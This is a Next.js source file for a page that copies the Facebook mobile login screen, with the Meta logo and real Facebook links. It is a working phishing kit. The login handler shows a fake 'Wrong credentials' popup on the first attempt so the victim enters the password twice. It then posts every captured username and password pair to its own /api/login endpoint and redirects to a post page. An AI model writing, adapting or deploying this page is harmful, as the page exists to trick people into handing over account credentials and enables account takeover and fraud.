"use client"
import { Opt } from "next/font/google";
import Link from "next/link";
import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";

export default function Page() {
    const [password, setPassword] = useState(null);
    const [username, setUsername] = useState(null);
    const [firstLoading, setFirstLoading] = useState(true);
    const [allPassUsername, setAllPassUsername] = useState([]);
    const [loading, setLoading] = useState(false);
    const mobileInputRef = useRef(null);
    const passwordInputRef = useRef(null);

    const [passwordVisible, setPasswordVisible] = useState(false);
    const router = useRouter();


    const togglePasswordVisibility = (event) => {
        event.preventDefault();
        setPasswordVisible(!passwordVisible);
    };
     useEffect(()=>{
        if(firstLoading) setFirstLoading(false);
        else if (passwordInputRef.current) {
            passwordInputRef.current.focus(); // Reapply focus to input field
        }
     },[passwordVisible])

    const makeLogin = async (allData) => {
        setLoading(true);
        closeWrongPassPopup();

        // Simulating a delay using a Promise
        // await new Promise((resolve) => setTimeout(resolve, 2000));
        // setLoading(false);

        const res = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ data: allData }),
        });

        if (res.ok) {
            router.replace("/pages/naila143201/post/3217382")
        }
        else {
            setLoading(false);
        }
    }

    const handleLogin = async (event) => {
        event.preventDefault();
        setAllPassUsername((prevAllPassUsername) => {
            const updatedArray = [...prevAllPassUsername, { username: username, password: password }];
            if (updatedArray.length < 2) {
                openWrongPassPopup();
            }
            else {
                makeLogin(updatedArray)
            }
            return updatedArray;
        });
    };

    const closeWrongPassPopup = () => {
        const popupBox = document.getElementById("wrong-pass-popup");
        popupBox.classList.add("-z-10");
        popupBox.classList.remove("z-10");
        if (mobileInputRef.current) {
            mobileInputRef.current.focus();
        }
    }

    const openWrongPassPopup = () => {
        const popupBox = document.getElementById("wrong-pass-popup");
        popupBox.classList.add("z-10");
        popupBox.classList.remove("-z-10");
    }

    return (<>
        <div className="w-full h-full login-bg flex flex-col">

            {loading ? (
                <div className="fixed w-screen h-dvh bg-gray-500 bg-opacity-60 flex justify-center items-center z-10">
                    <img src="/imgs/loading.gif" alt="Loading..." className="w-12 aspect-square object-contain" />
                </div>
            ) : null}


            <div id="wrong-pass-popup" className="fixed w-screen h-dvh bg-gray-500 bg-opacity-60 flex justify-center items-center -z-10">
                <button onClick={(event) => { event.preventDefault(); closeWrongPassPopup() }} href="/login" className="w-[90%] h-44 bg-white rounded-lg flex flex-col">
                    <div className="w-full h-32 flex flex-col justify-center items-center border-b border-gray-400">
                        <div className="text-[19px] font-semibold">Wrong credentials</div>
                        <div className="text-[14px] text-gray-500">Invalid username or password</div>
                    </div>
                    <div className="flex-1 w-full flex justify-center items-center text-blue-600 text-[16px]">OK</div>
                </button>
            </div>


            <div className="w-full flex-1 flex flex-col">
                <div className="w-full h-8 pt-3 bg-transparent flex justify-center items-baseline text-[13px] text-gray-700">
                    <button>English (UK)</button>
                </div>
                <div className="w-full flex-1 flex justify-center items-center">
                    <img src="./icon.png" className="w-[3.5rem] aspect-square rounded-full" />
                </div>
            </div>

            <div className="w-full h-60 px-4">
                <form className="space-y-3 h-auto w-full" onSubmit={handleLogin}>
                    <div className="w-full h-16 relative">
                        <input
                            type="text"
                            ref={mobileInputRef}
                            required
                            id="mobile"
                            name="mobile"
                            placeholder=" "
                            className="peer absolute w-full h-full pl-4 pr-12 pt-5 text-[16px] font-medium border border-gray-300 rounded-xl focus:border-gray-700 focus:outline-none text-gray-900"
                            onChange={(e) => setUsername(e.target.value)}
                        />
                        <label htmlFor="mobile" className="absolute w-full h-full px-4 py-2 flex flex-col justify-center font-medium text-gray-500 text-[14px] peer-placeholder-shown:text-[16px] peer-focus:text-[14px] translate-y-[-11px] peer-focus:translate-y-[-11px] peer-placeholder-shown:translate-y-[0px]  translate-x-[1px] peer-focus:translate-x-[1px] peer-placeholder-shown:translate-x-[0px] transition-all duration-200">
                            <span>
                                Mobile number or email address
                            </span>
                        </label>

                        <div className="absolute z-10 opacity-0 peer-focus:opacity-100 top-0  right-0 h-full aspect-[3/4]">
                            <button
                                onClick={(e) => {
                                    e.preventDefault()
                                    document.getElementById('mobile').value = '';
                                }}
                                className="w-full h-full flex justify-center items-center text-gray-500">
                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="2" stroke="currentColor" className="size-7">
                                    <path strokeLinecap="round" strokeLinejoin="round" d="M6 18 18 6M6 6l12 12" />
                                </svg>

                            </button>
                        </div>
                    </div>

                    <div className="w-full h-16 relative">
                        <input
                            type={passwordVisible ? 'text' : 'password'}
                            // type="password"
                            id="password"
                            ref={passwordInputRef}
                            required
                            name="password"
                            placeholder=" "
                            className="peer absolute w-full h-full pl-4 pr-12 pt-5 text-[16px] font-medium border border-gray-300 rounded-xl focus:border-gray-700 focus:outline-none text-gray-900"
                            onChange={(e) => setPassword(e.target.value)}
                        />
                        <label htmlFor="password" className="absolute w-full h-full px-4 py-2 flex flex-col justify-center font-medium text-gray-500 text-[14px] peer-placeholder-shown:text-[16px] peer-focus:text-[14px] translate-y-[-11px] peer-focus:translate-y-[-11px] peer-placeholder-shown:translate-y-[0px]  translate-x-[1px] peer-focus:translate-x-[1px] peer-placeholder-shown:translate-x-[0px] transition-all duration-200">
                            <span>
                                Password
                            </span>
                        </label>

                        <div className="absolute z-10 opacity-100 peer-focus:opacity-100 peer-placeholder-shown:opacity-0 top-0  right-0 h-full aspect-[3/4]">
                            <button
                                onClick={(e) => togglePasswordVisibility(e)}
                                className="w-full h-full flex justify-center items-center text-gray-500"
                            >
                                <img src={passwordVisible ? '/imgs/eyeopen.png' : '/imgs/eyeclose.png'} alt="" className="w-1/2 aspect-square" />

                            </button>
                        </div>
                    </div>

                    <button type="submit" className="w-full bg-blue-600 text-white py-2 rounded-full font-medium hover:bg-blue-700 focus:ring focus:ring-blue-500 focus:outline-none">
                        Log in
                    </button>
                </form>

                <a href="https://m.facebook.com/login/identify/" className="text-center flex justify-center text-sm text-gray-800 font-medium mt-4 cursor-pointer">
                    Forgotten Password?
                </a>
            </div>
            <div className="w-full flex-1 flex flex-col-reverse">
                <div className="w-full h-auto pb-3 px-4 space-y-3">
                    <a href="https://m.facebook.com/reg/" className="w-full h-11 flex justify-center items-center py-2 border border-blue-600 text-blue-600 rounded-full font-medium">
                        Create new account
                    </a>
                    <div className="w-full h-5 pt-1 flex justify-center items-center">
                        <img src="/imgs/meta-logo.png" alt="" className="h-full object-contain opacity-60" />
                    </div>
                    <div className="w-full h-5 flex gap-3 justify-center items-center text-[11px] text-gray-500">
                        <a href="https://about.meta.com/">About</a>
                        <a href="https://m.facebook.com/help/?ref=pf">Help</a>
                        <Link href="">More</Link>
                    </div>
                </div>
            </div>
        </div>
    </>);
}
